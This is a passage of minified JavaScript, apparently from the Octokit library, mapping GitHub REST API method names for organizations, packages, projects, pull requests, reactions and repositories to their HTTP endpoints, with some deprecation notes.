/orgs/{org}/hooks/{hook_id}"],enableOrDisableSecurityProductOnAllOrgRepos:["POST /orgs/{org}/{security_product}/{enablement}",{},{deprecated:"octokit.rest.orgs.enableOrDisableSecurityProductOnAllOrgRepos() is deprecated, see https://docs.github.com/rest/orgs/orgs#enable-or-disable-a-security-feature-for-an-organization"}],get:["GET /orgs/{org}"],getAllCustomProperties:["GET /orgs/{org}/properties/schema"],getCustomProperty:["GET /orgs/{org}/properties/schema/{custom_property_name}"],getMembershipForAuthenticatedUser:["GET /user/memberships/orgs/{org}"],getMembershipForUser:["GET /orgs/{org}/memberships/{username}"],getOrgRole:["GET /orgs/{org}/organization-roles/{role_id}"],getOrgRulesetHistory:["GET /orgs/{org}/rulesets/{ruleset_id}/history"],getOrgRulesetVersion:["GET /orgs/{org}/rulesets/{ruleset_id}/history/{version_id}"],getWebhook:["GET /orgs/{org}/hooks/{hook_id}"],getWebhookConfigForOrg:["GET /orgs/{org}/hooks/{hook_id}/config"],getWebhookDelivery:["GET /orgs/{org}/hooks/{hook_id}/deliveries/{delivery_id}"],list:["GET /organizations"],listAppInstallations:["GET /orgs/{org}/installations"],listAttestations:["GET /orgs/{org}/attestations/{subject_digest}"],listBlockedUsers:["GET /orgs/{org}/blocks"],listCustomPropertiesValuesForRepos:["GET /orgs/{org}/properties/values"],listFailedInvitations:["GET /orgs/{org}/failed_invitations"],listForAuthenticatedUser:["GET /user/orgs"],listForUser:["GET /users/{username}/orgs"],listInvitationTeams:["GET /orgs/{org}/invitations/{invitation_id}/teams"],listIssueTypes:["GET /orgs/{org}/issue-types"],listMembers:["GET /orgs/{org}/members"],listMembershipsForAuthenticatedUser:["GET /user/memberships/orgs"],listOrgRoleTeams:["GET /orgs/{org}/organization-roles/{role_id}/teams"],listOrgRoleUsers:["GET /orgs/{org}/organization-roles/{role_id}/users"],listOrgRoles:["GET /orgs/{org}/organization-roles"],listOrganizationFineGrainedPermissions:["GET /orgs/{org}/organization-fine-grained-permissions"],listOutsideCollaborators:["GET /orgs/{org}/outside_collaborators"],listPatGrantRepositories:["GET /orgs/{org}/personal-access-tokens/{pat_id}/repositories"],listPatGrantRequestRepositories:["GET /orgs/{org}/personal-access-token-requests/{pat_request_id}/repositories"],listPatGrantRequests:["GET /orgs/{org}/personal-access-token-requests"],listPatGrants:["GET /orgs/{org}/personal-access-tokens"],listPendingInvitations:["GET /orgs/{org}/invitations"],listPublicMembers:["GET /orgs/{org}/public_members"],listSecurityManagerTeams:["GET /orgs/{org}/security-managers",{},{deprecated:"octokit.rest.orgs.listSecurityManagerTeams() is deprecated, see https://docs.github.com/rest/orgs/security-managers#list-security-manager-teams"}],listWebhookDeliveries:["GET /orgs/{org}/hooks/{hook_id}/deliveries"],listWebhooks:["GET /orgs/{org}/hooks"],pingWebhook:["POST /orgs/{org}/hooks/{hook_id}/pings"],redeliverWebhookDelivery:["POST /orgs/{org}/hooks/{hook_id}/deliveries/{delivery_id}/attempts"],removeCustomProperty:["DELETE /orgs/{org}/properties/schema/{custom_property_name}"],removeMember:["DELETE /orgs/{org}/members/{username}"],removeMembershipForUser:["DELETE /orgs/{org}/memberships/{username}"],removeOutsideCollaborator:["DELETE /orgs/{org}/outside_collaborators/{username}"],removePublicMembershipForAuthenticatedUser:["DELETE /orgs/{org}/public_members/{username}"],removeSecurityManagerTeam:["DELETE /orgs/{org}/security-managers/teams/{team_slug}",{},{deprecated:"octokit.rest.orgs.removeSecurityManagerTeam() is deprecated, see https://docs.github.com/rest/orgs/security-managers#remove-a-security-manager-team"}],reviewPatGrantRequest:["POST /orgs/{org}/personal-access-token-requests/{pat_request_id}"],reviewPatGrantRequestsInBulk:["POST /orgs/{org}/personal-access-token-requests"],revokeAllOrgRolesTeam:["DELETE /orgs/{org}/organization-roles/teams/{team_slug}"],revokeAllOrgRolesUser:["DELETE /orgs/{org}/organization-roles/users/{username}"],revokeOrgRoleTeam:["DELETE /orgs/{org}/organization-roles/teams/{team_slug}/{role_id}"],revokeOrgRoleUser:["DELETE /orgs/{org}/organization-roles/users/{username}/{role_id}"],setMembershipForUser:["PUT /orgs/{org}/memberships/{username}"],setPublicMembershipForAuthenticatedUser:["PUT /orgs/{org}/public_members/{username}"],unblockUser:["DELETE /orgs/{org}/blocks/{username}"],update:["PATCH /orgs/{org}"],updateIssueType:["PUT /orgs/{org}/issue-types/{issue_type_id}"],updateMembershipForAuthenticatedUser:["PATCH /user/memberships/orgs/{org}"],updatePatAccess:["POST /orgs/{org}/personal-access-tokens/{pat_id}"],updatePatAccesses:["POST /orgs/{org}/personal-access-tokens"],updateWebhook:["PATCH /orgs/{org}/hooks/{hook_id}"],updateWebhookConfigForOrg:["PATCH /orgs/{org}/hooks/{hook_id}/config"]},packages:{deletePackageForAuthenticatedUser:["DELETE /user/packages/{package_type}/{package_name}"],deletePackageForOrg:["DELETE /orgs/{org}/packages/{package_type}/{package_name}"],deletePackageForUser:["DELETE /users/{username}/packages/{package_type}/{package_name}"],deletePackageVersionForAuthenticatedUser:["DELETE /user/packages/{package_type}/{package_name}/versions/{package_version_id}"],deletePackageVersionForOrg:["DELETE /orgs/{org}/packages/{package_type}/{package_name}/versions/{package_version_id}"],deletePackageVersionForUser:["DELETE /users/{username}/packages/{package_type}/{package_name}/versions/{package_version_id}"],getAllPackageVersionsForAPackageOwnedByAnOrg:["GET /orgs/{org}/packages/{package_type}/{package_name}/versions",{},{renamed:["packages","getAllPackageVersionsForPackageOwnedByOrg"]}],getAllPackageVersionsForAPackageOwnedByTheAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}/versions",{},{renamed:["packages","getAllPackageVersionsForPackageOwnedByAuthenticatedUser"]}],getAllPackageVersionsForPackageOwnedByAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}/versions"],getAllPackageVersionsForPackageOwnedByOrg:["GET /orgs/{org}/packages/{package_type}/{package_name}/versions"],getAllPackageVersionsForPackageOwnedByUser:["GET /users/{username}/packages/{package_type}/{package_name}/versions"],getPackageForAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}"],getPackageForOrganization:["GET /orgs/{org}/packages/{package_type}/{package_name}"],getPackageForUser:["GET /users/{username}/packages/{package_type}/{package_name}"],getPackageVersionForAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}/versions/{package_version_id}"],getPackageVersionForOrganization:["GET /orgs/{org}/packages/{package_type}/{package_name}/versions/{package_version_id}"],getPackageVersionForUser:["GET /users/{username}/packages/{package_type}/{package_name}/versions/{package_version_id}"],listDockerMigrationConflictingPackagesForAuthenticatedUser:["GET /user/docker/conflicts"],listDockerMigrationConflictingPackagesForOrganization:["GET /orgs/{org}/docker/conflicts"],listDockerMigrationConflictingPackagesForUser:["GET /users/{username}/docker/conflicts"],listPackagesForAuthenticatedUser:["GET /user/packages"],listPackagesForOrganization:["GET /orgs/{org}/packages"],listPackagesForUser:["GET /users/{username}/packages"],restorePackageForAuthenticatedUser:["POST /user/packages/{package_type}/{package_name}/restore{?token}"],restorePackageForOrg:["POST /orgs/{org}/packages/{package_type}/{package_name}/restore{?token}"],restorePackageForUser:["POST /users/{username}/packages/{package_type}/{package_name}/restore{?token}"],restorePackageVersionForAuthenticatedUser:["POST /user/packages/{package_type}/{package_name}/versions/{package_version_id}/restore"],restorePackageVersionForOrg:["POST /orgs/{org}/packages/{package_type}/{package_name}/versions/{package_version_id}/restore"],restorePackageVersionForUser:["POST /users/{username}/packages/{package_type}/{package_name}/versions/{package_version_id}/restore"]},privateRegistries:{createOrgPrivateRegistry:["POST /orgs/{org}/private-registries"],deleteOrgPrivateRegistry:["DELETE /orgs/{org}/private-registries/{secret_name}"],getOrgPrivateRegistry:["GET /orgs/{org}/private-registries/{secret_name}"],getOrgPublicKey:["GET /orgs/{org}/private-registries/public-key"],listOrgPrivateRegistries:["GET /orgs/{org}/private-registries"],updateOrgPrivateRegistry:["PATCH /orgs/{org}/private-registries/{secret_name}"]},projects:{addCollaborator:["PUT /projects/{project_id}/collaborators/{username}",{},{deprecated:"octokit.rest.projects.addCollaborator() is deprecated, see https://docs.github.com/rest/projects/collaborators#add-project-collaborator"}],createCard:["POST /projects/columns/{column_id}/cards",{},{deprecated:"octokit.rest.projects.createCard() is deprecated, see https://docs.github.com/rest/projects/cards#create-a-project-card"}],createColumn:["POST /projects/{project_id}/columns",{},{deprecated:"octokit.rest.projects.createColumn() is deprecated, see https://docs.github.com/rest/projects/columns#create-a-project-column"}],createForAuthenticatedUser:["POST /user/projects",{},{deprecated:"octokit.rest.projects.createForAuthenticatedUser() is deprecated, see https://docs.github.com/rest/projects/projects#create-a-user-project"}],createForOrg:["POST /orgs/{org}/projects",{},{deprecated:"octokit.rest.projects.createForOrg() is deprecated, see https://docs.github.com/rest/projects/projects#create-an-organization-project"}],createForRepo:["POST /repos/{owner}/{repo}/projects",{},{deprecated:"octokit.rest.projects.createForRepo() is deprecated, see https://docs.github.com/rest/projects/projects#create-a-repository-project"}],delete:["DELETE /projects/{project_id}",{},{deprecated:"octokit.rest.projects.delete() is deprecated, see https://docs.github.com/rest/projects/projects#delete-a-project"}],deleteCard:["DELETE /projects/columns/cards/{card_id}",{},{deprecated:"octokit.rest.projects.deleteCard() is deprecated, see https://docs.github.com/rest/projects/cards#delete-a-project-card"}],deleteColumn:["DELETE /projects/columns/{column_id}",{},{deprecated:"octokit.rest.projects.deleteColumn() is deprecated, see https://docs.github.com/rest/projects/columns#delete-a-project-column"}],get:["GET /projects/{project_id}",{},{deprecated:"octokit.rest.projects.get() is deprecated, see https://docs.github.com/rest/projects/projects#get-a-project"}],getCard:["GET /projects/columns/cards/{card_id}",{},{deprecated:"octokit.rest.projects.getCard() is deprecated, see https://docs.github.com/rest/projects/cards#get-a-project-card"}],getColumn:["GET /projects/columns/{column_id}",{},{deprecated:"octokit.rest.projects.getColumn() is deprecated, see https://docs.github.com/rest/projects/columns#get-a-project-column"}],getPermissionForUser:["GET /projects/{project_id}/collaborators/{username}/permission",{},{deprecated:"octokit.rest.projects.getPermissionForUser() is deprecated, see https://docs.github.com/rest/projects/collaborators#get-project-permission-for-a-user"}],listCards:["GET /projects/columns/{column_id}/cards",{},{deprecated:"octokit.rest.projects.listCards() is deprecated, see https://docs.github.com/rest/projects/cards#list-project-cards"}],listCollaborators:["GET /projects/{project_id}/collaborators",{},{deprecated:"octokit.rest.projects.listCollaborators() is deprecated, see https://docs.github.com/rest/projects/collaborators#list-project-collaborators"}],listColumns:["GET /projects/{project_id}/columns",{},{deprecated:"octokit.rest.projects.listColumns() is deprecated, see https://docs.github.com/rest/projects/columns#list-project-columns"}],listForOrg:["GET /orgs/{org}/projects",{},{deprecated:"octokit.rest.projects.listForOrg() is deprecated, see https://docs.github.com/rest/projects/projects#list-organization-projects"}],listForRepo:["GET /repos/{owner}/{repo}/projects",{},{deprecated:"octokit.rest.projects.listForRepo() is deprecated, see https://docs.github.com/rest/projects/projects#list-repository-projects"}],listForUser:["GET /users/{username}/projects",{},{deprecated:"octokit.rest.projects.listForUser() is deprecated, see https://docs.github.com/rest/projects/projects#list-user-projects"}],moveCard:["POST /projects/columns/cards/{card_id}/moves",{},{deprecated:"octokit.rest.projects.moveCard() is deprecated, see https://docs.github.com/rest/projects/cards#move-a-project-card"}],moveColumn:["POST /projects/columns/{column_id}/moves",{},{deprecated:"octokit.rest.projects.moveColumn() is deprecated, see https://docs.github.com/rest/projects/columns#move-a-project-column"}],removeCollaborator:["DELETE /projects/{project_id}/collaborators/{username}",{},{deprecated:"octokit.rest.projects.removeCollaborator() is deprecated, see https://docs.github.com/rest/projects/collaborators#remove-user-as-a-collaborator"}],update:["PATCH /projects/{project_id}",{},{deprecated:"octokit.rest.projects.update() is deprecated, see https://docs.github.com/rest/projects/projects#update-a-project"}],updateCard:["PATCH /projects/columns/cards/{card_id}",{},{deprecated:"octokit.rest.projects.updateCard() is deprecated, see https://docs.github.com/rest/projects/cards#update-an-existing-project-card"}],updateColumn:["PATCH /projects/columns/{column_id}",{},{deprecated:"octokit.rest.projects.updateColumn() is deprecated, see https://docs.github.com/rest/projects/columns#update-an-existing-project-column"}]},pulls:{checkIfMerged:["GET /repos/{owner}/{repo}/pulls/{pull_number}/merge"],create:["POST /repos/{owner}/{repo}/pulls"],createReplyForReviewComment:["POST /repos/{owner}/{repo}/pulls/{pull_number}/comments/{comment_id}/replies"],createReview:["POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews"],createReviewComment:["POST /repos/{owner}/{repo}/pulls/{pull_number}/comments"],deletePendingReview:["DELETE /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}"],deleteReviewComment:["DELETE /repos/{owner}/{repo}/pulls/comments/{comment_id}"],dismissReview:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}/dismissals"],get:["GET /repos/{owner}/{repo}/pulls/{pull_number}"],getReview:["GET /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}"],getReviewComment:["GET /repos/{owner}/{repo}/pulls/comments/{comment_id}"],list:["GET /repos/{owner}/{repo}/pulls"],listCommentsForReview:["GET /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}/comments"],listCommits:["GET /repos/{owner}/{repo}/pulls/{pull_number}/commits"],listFiles:["GET /repos/{owner}/{repo}/pulls/{pull_number}/files"],listRequestedReviewers:["GET /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"],listReviewComments:["GET /repos/{owner}/{repo}/pulls/{pull_number}/comments"],listReviewCommentsForRepo:["GET /repos/{owner}/{repo}/pulls/comments"],listReviews:["GET /repos/{owner}/{repo}/pulls/{pull_number}/reviews"],merge:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/merge"],removeRequestedReviewers:["DELETE /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"],requestReviewers:["POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"],submitReview:["POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}/events"],update:["PATCH /repos/{owner}/{repo}/pulls/{pull_number}"],updateBranch:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/update-branch"],updateReview:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}"],updateReviewComment:["PATCH /repos/{owner}/{repo}/pulls/comments/{comment_id}"]},rateLimit:{get:["GET /rate_limit"]},reactions:{createForCommitComment:["POST /repos/{owner}/{repo}/comments/{comment_id}/reactions"],createForIssue:["POST /repos/{owner}/{repo}/issues/{issue_number}/reactions"],createForIssueComment:["POST /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions"],createForPullRequestReviewComment:["POST /repos/{owner}/{repo}/pulls/comments/{comment_id}/reactions"],createForRelease:["POST /repos/{owner}/{repo}/releases/{release_id}/reactions"],createForTeamDiscussionCommentInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}/reactions"],createForTeamDiscussionInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/reactions"],deleteForCommitComment:["DELETE /repos/{owner}/{repo}/comments/{comment_id}/reactions/{reaction_id}"],deleteForIssue:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/reactions/{reaction_id}"],deleteForIssueComment:["DELETE /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions/{reaction_id}"],deleteForPullRequestComment:["DELETE /repos/{owner}/{repo}/pulls/comments/{comment_id}/reactions/{reaction_id}"],deleteForRelease:["DELETE /repos/{owner}/{repo}/releases/{release_id}/reactions/{reaction_id}"],deleteForTeamDiscussion:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/reactions/{reaction_id}"],deleteForTeamDiscussionComment:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}/reactions/{reaction_id}"],listForCommitComment:["GET /repos/{owner}/{repo}/comments/{comment_id}/reactions"],listForIssue:["GET /repos/{owner}/{repo}/issues/{issue_number}/reactions"],listForIssueComment:["GET /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions"],listForPullRequestReviewComment:["GET /repos/{owner}/{repo}/pulls/comments/{comment_id}/reactions"],listForRelease:["GET /repos/{owner}/{repo}/releases/{release_id}/reactions"],listForTeamDiscussionCommentInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}/reactions"],listForTeamDiscussionInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/reactions"]},repos:{acceptInvitation:["PATCH /user/repository_invitations/{invitation_id}",{},{renamed:["repos","acceptInvitationForAuthenticatedUser"]}],acceptInvitationForAuthenticatedUser:["PATCH /user/repository_invitations/{invitation_id}"],addAppAccessRestrictions:["POST /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps",{},{mapToData:"apps"}],addCollaborator:["PUT /repos/{owner}/{repo}/collaborators/{username}"],addStatusCheckContexts:["POST /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts",{},{mapToData:"contexts"}],addTeamAccessRestrictions:["POST /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams",{},{mapToData:"teams"}],addUserAccessRestrictions:["POST /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users",{},{mapToData:"users"}],cancelPagesDeployment:["POST /repos/{owner}/{repo}/pages/deployments/{pages_deployment_id}/cancel"],checkAutomatedSecurityFixes:["GET /repos/{owner}/{repo}/automated-security-fixes"],checkCollaborator:["GET /repos/{owner}/{repo}/collaborators/{username}"],checkPrivateVulnerabilityReporting:["GET /repos/{owner}/{repo}/private-vulnerability-reporting"],checkVulnerabilityAlerts:["GET /repos/{owner}/{repo}/vulnerability-alerts"],codeownersErrors:["GET /repos/{owner}/{repo}/codeowners/errors"],compareCommits:["GET /repos/{owner}/{repo}/compare/{base}...{head}"],compareCommitsWithBasehead:["GET /repos/{owner}/{repo}/compare/{basehead}"],createAttestation:["POST /repos/{owner}/{repo}/attestations"],createAutolink:["POST /repos/{owner}/{repo}/autolinks"],createCommitComment:["POST /repos/{owner}/{repo}/commits/{commit_sha}/comments"],createCommitSignatureProtection:["POST /repos/{owner}/{repo}/branches/{branch}/protection/required_signatures"],createCommitStatus:["POST /repos/{owner}/{repo}/statuses/{sha}"],createDeployKey:["POST /repos/{owner}/{repo}/keys"],createDeployment:["POST /repos/{owner}/{repo}/deployments"],createDeploymentBranchPolicy:["POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies"],createDeploymentProtectionRule:["POST /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules"],createDeploymentStatus:["POST /repos/{owner}/{repo}/deployments/{deployment_id}/statuses"],createDispatchEvent:["POST /repos/{owner}/{repo}/dispatches"],createForAuthenticatedUser:["POST /user/repos"],createFork:["POST /repos/{owner}/{repo}/forks"],createInOrg:["POST /orgs/{org}/repos"],createOrUpdateCustomPropertiesValues:["PATCH /repos/{owner}/{repo}/properties/values"],createOrUpdateEnvironment:["PUT /repos/{owner}/{repo}/environments/{environment_name}"],createOrUpdateFileContents:["PUT /repos/{owner}/{repo}/contents/{path}"],createOrgRuleset:["POST /orgs/{org}/rulesets"],createPagesDeployment:["POST /repos/{owner}/{repo}/pages/deployments"],createPagesSite:["POST /repos/{owner}/{repo}/pages"],createRelease:["POST /repos/{owner}/{repo}/releases"],createRepoRuleset:["POST /repos/{owner}/{repo}/rulesets"],createUsingTemplate:["POST /repos/{template_owner}/{template_repo}/generate"],createWebhook:["POST /repos/{owner}/{repo}/hooks"],declineInvitation:["DELETE /user/repository_invitations/{invitation_id}",{},{renamed:["repos","declineInvitationForAuthenticatedUser"]}],declineInvitationForAuthenticatedUser:["DELETE /user/repository_invitations/{invitation_id}"],delete:["DELETE /repos/{owner}/{repo}"],deleteAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions"],deleteAdminBranchProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/enforce_admins"],deleteAnEnvironment:["DELETE /repos/{owner}/{repo}/environments/{environment_name}"],deleteAutolink:["DELETE /repos/{owner}/{repo}/autolinks/{autolink_id}"],deleteBranchProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection"],deleteCommitComment:["DELETE /repos/{owner}/{repo}/comments/{comment_id}"],deleteCommitSignatureProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_signatures"],deleteDeployKey:["DELETE /repos/{owner}/{repo}/keys/{key_id}"],deleteDeployment:["DELETE /repos/{owner}/{repo}/deployments/{deployment_id}"],deleteDeploymentBranchPolicy:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies/{branch_policy_id}"],deleteFile:["DELETE /repos/{owner}/{repo}/contents/{path}"],deleteInvitation:["DELETE /repos/{owner}/{repo}/invitations/{invitation_id}"],deleteOrgRuleset:["DELETE /orgs/{org}/rulesets/{ruleset_id}"],deletePagesSite:["DELETE /repos/{owner}/{repo}/pages"],deletePullRequestReviewProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_pull_request_reviews"],deleteRelease:["DELETE /repos/{owner}/{repo}/releases/{release_id}"],deleteReleaseAsset:["DELETE /repos/{owner}/{repo}/releases/assets/{asset_id}"],deleteRepoRuleset:["DELETE /repos/{owner}/{repo}/rulesets/{ruleset_id}"],deleteWebhook:["DELETE /repos/{owner}/{repo}/hooks/{hook_id}"],disableAutomatedSecurityFixes:["DELETE /repos/{owner}/{repo}/automated-security-fixes"],disableDeploymentProtectionRule:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules/{protection_rule_id}"],disablePrivateVulnerabilityReporting:["DELETE /repos/{owner}/{repo}/private-vulnerability-reporting"],disableVulnerabilityAlerts:["DELETE /repos/{owner}/{repo}/vulnerability-alerts"],downloadArchive:["GET /repos/{owner}/{repo}/zipball/{ref}",{},{renamed:["repos","downloadZipballArchive"]}],downloadTarballArchive:["GET /repos/{owner}/{repo}/tarball/{ref}"],downloadZipballArchive:["GET /repos/{owner}/{repo}/zipball/{ref}"],enableAutomatedSecurityFixes:["PUT /repos/{owner}/{repo}/automated-security-fixes"],enablePrivateVulnerabilityReporting:["PUT /repos/{owner}/{repo}/private-vulnerability-reporting"],enableVulnerabilityAlerts:["PUT /repos/{owner}/{repo}/vulnerability-alerts"],generateReleaseNotes:["POST /repos/{owner}/{repo}/releases/generate-notes"],get:["GET /repos/{owner}/{repo}"],getAccessRestrictions:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions"],getAdminBranchProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/enforce_admins"],getAllDeploymentProtectionRules:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules"],getAllEnvironments:["GET /repos/{owner}/{repo}/environments"],getAllStatusCheckContexts:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts"],getAllTopics:["GET /repos/{owner}/{repo}/topics"],getAppsWithAccessToProtectedBranch:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps"],getAutolink:["GET /repos/{owner}/{repo}/autolinks/{autolink_id}"],getBranch:["GET /repos/{owner}/{repo}/branches/{branch}"],getBranchProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection"],getBranchRules:["GET /repos/{owner}/{repo}/rules/branches/{branch}"],getClones:["GET /repos/{owner}/{repo}/traffic/clones"],getCodeFrequencyStats:["GET /repos/{owner}/{repo}/stats/code_frequency"],getCollaboratorPermissionLevel:["GET /repos/{owner}/{repo}/collaborators/{username}/permission"],getCombinedStatusForRef:["GET /repos/{owner}/{repo}/commits/{ref}/status"],getCommit:["GET /repos/{owner}/{repo}/commits/{ref}"],getCommitActivityStats:["GET /repos/{owner}/{repo}/stats/commit_activity"],getCommitComment:["GET /repos/{owner}/{repo}/comments/{comment_id}"],getCommitSignatureProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_signatures"],getCommunityProfileMetrics:["GET /repos/{owner}/{repo}/community/profile"],getContent:["GET /repos/{owner}/{repo}/contents/{path}"],getContributorsStats:["GET /repos/{owner}/{repo}/stats/contributors"],getCustomDeploymentProtectionRule:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules/{protection_rule_id}"],getCustomPropertiesValues:["GET /repos/{owner}/{repo}/properties/values"],getDeployKey:["GET /repos/{owner}/{repo}/keys/{key_id}"],getDeployment:["GET /repos/{owner}/{repo}/deployments/{deployment_id}"],getDeploymentBranchPolicy:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies/{branch_policy_id}"],getDeploymentStatus:["GET /repos/{owner}/{repo}/deployments/{deployment_id}/statuses/{status_id}"],getEnvironment:["GET /repos/{owner}/{repo}/environments/{environment_name}"],getLatestPagesBuild:["GET /repos/{owner}/{repo}/pages/builds/latest"],getLatestRelease:["GET /repos/{owner}/{repo}/releases/latest"],getOrgRuleSuite:["GET /orgs/{org}/rulesets/rule-suites/{rule_suite_id}"],getOrgRuleSuites:["GET /orgs/{org}/rulesets/rule-suites"],getOrgRuleset:["GET /orgs/{org}/rulesets/{ruleset_id}"],getOrgRulesets:["GET /orgs/{org}/rulesets"],getPages:["GET /repos/{owner}/{repo}/pages"],getPagesBuild:["GET /repos/{owner}/{repo}/pages/builds/{build_id}"],getPagesDeployment:["GET /repos/{owner}/{repo}/pages/deployments/{pages_deployment_id}"],getPagesHealthCheck:["GET /repos/{owner}/{repo}/pages/health"],getParticipationStats:["GET /repos/{owner}/{repo}/stats/participation"],getPullRequestReviewProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_pull_request_reviews"],getPunchCardStats:["GET /repos/{owner}/{repo}/stats/punch_card"],getReadme:["GET /repos/{owner}/{repo}/readme"],getReadmeInDirectory:["GET /repos/{owner}/{repo}/readme/{dir}"],getRelease:["GET /repos/{owner}/{repo}/releases/{release_id}"],getReleaseAsset:["GET /repos/{owner}/{repo}/releases/assets/{asset_id}"],getReleaseByTag:["GET /repos/{owner}/{repo}/releases/tags/{tag}"],getRepoRuleSuite:["GET /repos/{owner}/{repo}/rulesets/rule-suites/{rule_suite_id}"],getRepoRuleSuites:["GET /repos/{owner}/{repo}/rulesets/rule-suites"],getRepoRuleset:["GET /repos/{owner}/{repo}/rulesets/{ruleset_id}"],getRepoRulesetHistory:["GET /repos/{owner}/{repo}/rulesets/{ruleset_id}/history"],getRepoRulesetVersion:["GET /repos/{owner}/{repo}/rulesets/{ruleset_id}/history/{version_id}"],getRepoRulesets:["GET /repos/{owner}/{repo}/rulesets"],getStatusChecksProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks"],getTeamsWithAccessToProtectedBranch:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams"],getTopPaths:["GET /repos/{owner}/{repo}/traffic/popular/paths"],getTopReferrers:["GET /repos/{owner}/{repo}/traffic/popular/referrers"],getUsersWithAccessToProtectedBranch:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users"],getViews:["GET /repos/{owner}/{repo}/traffic/views"],getWebhook:["GET /repos/{owner}/{repo}/hooks/{hook_id}"],getWebhookConfigForRepo:["GET /repos/{owner}/{repo}/hooks/{hook_id}/config"],getWebhookDelivery:["GET /repos/{owner}/{repo}/hooks/{hook_id}/deliveries/{delivery_id}"],listActivities:["GET /repos/{owner}/{repo}/activity"],listAttestations:["GET /repos/{owner}/{repo}/attestations/{subject_digest}"],listAutolinks:["GET /repos/{owner}/{repo}/autolinks"],listBranches:["GET /repos/{owner}/{repo}/branches"],listBranchesForHeadCommit:["GET /repos/{owner}/{repo}/commits/{commit_sha}/branches-where-head"],listCollaborators:["GET /repos/{owner}/{repo}/collaborators"],listCommentsForCommit:["GET /repos/{owner}/{repo}/commits/{commit_sha}/comments"],listCommitCommentsForRepo:["GET /repos/{owner}/{repo}/comments"],listCommitStatusesForRef:["GET /repos/{owner}/{repo}/commits/{ref}/statuses"],listCommits:["GET /repos/{owner}/{repo}/commits"],listContributors:["GET /repos/{owner}/{repo}/contributors"],listCustomDeploymentRuleIntegrations:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules/apps"],listDeployKeys:["GET /repos/{owner}/{repo}/keys"],listDeploymentBranchPolicies:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies"],listDeploymentStatuses:["GET /repos/{owner}/{repo}/deployments/{deployment_id}/statuses"],listDeployments:["GET /repos/{owner}/{repo}/deployments"],listForAuthenticatedUser:["GET /user/repos"],listForOrg:["GET /orgs/{org}/repos"],listForUser:["GET /users/{username}/repos"],listForks:["GET /repos/{owner}/{repo}/forks"],listInvitations:["GET /repos/{owner}/{repo}/invitations"],listInvitationsForAuthenticatedUser:["GET /user/repository_invitations"],listLanguages:["GET /repos/{owner}/{repo}/languages"],listPagesBuilds:["GET /repos/{owner}/{repo}/pages/builds"],listPublic:["GET /repositories"],listPullRequestsAssociatedWithCommit:["GET /repos/{owner}/{repo}/commits/{commit_sha}/pulls"],listReleaseAssets:["GET /repos/{owner}/{repo}/releases/{release_id}/assets"],listReleases:["GET /repos/{owner}/{repo}/releases"],listTags:["GET /repos/{owner}/{repo}/tags"],listTeams:["GET /repos/{owner}/{repo}/teams"],listWebhookDeliveries:["GET /repos/{owner}/{repo}/hooks/{hook_id}/deliveries"],listWebhooks:["GET /repos/{owner}/{repo}/hooks"],merge:["POST /repos/{owner}/{repo}/merges"],mergeUpstream:["POST /repos/{owner}/{repo}/merge-upstream"],pingWebhook:["POST /repos/{owner}/{repo}/hooks/{hook_id}/pings"],redeliverWebhookDelivery:["POST /repos/{owner}/{repo}/hooks/{hook_id}/deliveries/{delivery_id}/attempts"],removeAppAccessRestrictions:["DELETE 